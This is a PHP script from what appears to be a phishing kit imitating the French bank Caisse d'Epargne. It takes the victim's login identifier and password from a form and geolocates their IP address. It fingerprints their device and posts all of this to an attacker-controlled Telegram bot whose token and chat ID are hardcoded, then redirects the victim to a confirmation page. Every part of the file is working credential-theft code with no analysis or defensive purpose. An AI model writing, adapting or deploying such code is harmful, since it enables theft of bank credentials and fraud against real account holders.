<?php
// 1. Récupération des données du formulaire
$identifier = $_POST['identifier'] ?? '';
$password = $_POST['inp_ce_mp'] ?? '';
$bank = "CAISSE D'EPARGNE"; // Nom fixe puisque c'est la Caisse d'Épargne

// 2. Récupérer l'IP (en tenant compte des proxies)
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];

// 3. Géolocalisation avec ipinfo.io (avec votre token)
$geoInfo = json_decode(file_get_contents("https://ipinfo.io/{$ip}/json?token=3416ceaf95a319"), true);

// 4. Date et heure précises avec fuseau horaire
$timezone = $geoInfo['timezone'] ?? 'Europe/Paris';
date_default_timezone_set($timezone);
$currentTime = date('H:i:s');
$currentDate = date('d/m/Y');
$timestamp = time();

// 5. Détection du navigateur et OS
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Inconnu';
$deviceInfo = getDeviceInfo($userAgent);

// 6. Construire le message Telegram enrichi
$message = "
🏦 NOUVELLE CONNEXION {$bank}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ DATE ET HEURE:
📅 Date: {$currentDate}
🕒 Heure: {$currentTime}
⏱ Timestamp: {$timestamp}
🌐 Fuseau: {$timezone}

🔐 DONNÉES DE CONNEXION:
👤 Identifiant: {$identifier}
🔑 Mot de Passe: {$password}

📍 GÉOLOCALISATION:
🌍 IP: {$ip}
🏙️ Ville: " . ($geoInfo['city'] ?? 'Inconnue') . "
📌 Pays: " . ($geoInfo['country'] ?? 'Inconnu') . "
🗺️ Région: " . ($geoInfo['region'] ?? 'Inconnue') . "

💻 INFOS APPAREIL:
🖥️ Système: {$deviceInfo['os']} ({$deviceInfo['os_version']})
🌐 Navigateur: {$deviceInfo['browser']} ({$deviceInfo['browser_version']})
📱 Type: {$deviceInfo['device_type']}
🖥️ Résolution: {$deviceInfo['screen_width']}x{$deviceInfo['screen_height']}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
";

// 7. Envoi à Telegram avec cURL
$telegramToken = "7749490498:AAHVQ5yVLBT1vFuulMXDe6GqA7K9pVk5YWs";
$telegramChatId = "7796457959";

$url = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
$data = [
    'chat_id' => $telegramChatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// 8. Redirection vers une page de confirmation
header("Location: ../final.php");
exit;

// Fonction pour détecter les infos de l'appareil
function getDeviceInfo($userAgent) {
    // Détection du navigateur
    if (strpos($userAgent, 'Chrome') !== false) {
        $browser = 'Chrome';
        preg_match('/Chrome\/([\d.]+)/', $userAgent, $matches);
        $browser_version = $matches[1] ?? 'Inconnue';
    } elseif (strpos($userAgent, 'Firefox') !== false) {
        $browser = 'Firefox';
        preg_match('/Firefox\/([\d.]+)/', $userAgent, $matches);
        $browser_version = $matches[1] ?? 'Inconnue';
    } else {
        $browser = 'Autre';
        $browser_version = 'Inconnue';
    }

    // Détection de l'OS
    if (strpos($userAgent, 'Windows') !== false) {
        $os = 'Windows';
        preg_match('/Windows NT ([\d.]+)/', $userAgent, $matches);
        $os_version = $matches[1] ?? 'Inconnue';
    } elseif (strpos($userAgent, 'iPhone') !== false) {
        $os = 'iOS';
        preg_match('/iPhone OS ([\d_]+)/', $userAgent, $matches);
        $os_version = str_replace('_', '.', $matches[1] ?? 'Inconnue');
    } elseif (strpos($userAgent, 'Android') !== false) {
        $os = 'Android';
        preg_match('/Android ([\d.]+)/', $userAgent, $matches);
        $os_version = $matches[1] ?? 'Inconnue';
    } else {
        $os = 'Autre';
        $os_version = 'Inconnue';
    }

    // Détection du type d'appareil
    if (strpos($userAgent, 'Mobile') !== false) {
        $device_type = 'Mobile';
    } elseif (strpos($userAgent, 'Tablet') !== false) {
        $device_type = 'Tablette';
    } else {
        $device_type = 'Desktop';
    }

    return [
        'browser' => $browser,
        'browser_version' => $browser_version,
        'os' => $os,
        'os_version' => $os_version,
        'device_type' => $device_type,
        'screen_width' => $_POST['screen_width'] ?? 'Inconnue',
        'screen_height' => $_POST['screen_height'] ?? 'Inconnue'
    ];
}
?>